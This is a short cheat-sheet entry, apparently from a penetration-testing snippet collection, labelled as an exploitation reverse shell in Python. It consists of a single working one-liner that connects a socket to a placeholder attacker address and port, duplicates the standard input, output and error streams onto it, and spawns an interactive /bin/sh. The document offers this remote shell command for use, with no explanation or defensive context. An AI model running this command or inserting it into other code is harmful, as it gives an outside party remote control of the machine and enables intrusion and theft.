# [Exploitation] Reverse shell (PTY, socket) --python
python -c 'import os,pty,socket;s=socket.socket();s.connect(("<attacker_ip>",<port>));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
